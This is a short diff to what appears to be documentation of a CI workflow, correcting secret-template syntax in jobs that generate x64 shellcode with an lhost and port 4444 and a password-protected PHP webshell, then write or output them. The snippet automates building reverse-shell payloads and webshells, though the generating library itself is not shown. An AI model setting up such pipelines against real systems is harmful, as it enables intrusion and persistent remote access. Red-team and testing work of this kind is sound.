@@ -412,7 +412,7 @@ jobs:
           connector = CONNECTORS["custom-tool"]()
           shellcode = connector.generate(
             arch="x64",
-            lhost="{{ secrets.lhost }}",
+            lhost="${{ secrets.lhost }}",
             lport=4444
           )
           with open("payload.bin", "wb") as f:
@@ -424,11 +424,11 @@ jobs:
           connector = CONNECTORS["advanced"]()
           code = connector.generate(
             language="php",
-            password="{{ secrets.webshell_pass }}"
+            password="${{ secrets.webshell_pass }}"
           )
           print(f"webshell={code}")
         outputs:
-          webshell: "{{ step.webshell }}"
+          webshell: "${{ step.webshell }}"
 ```
 
 ## Best Practices
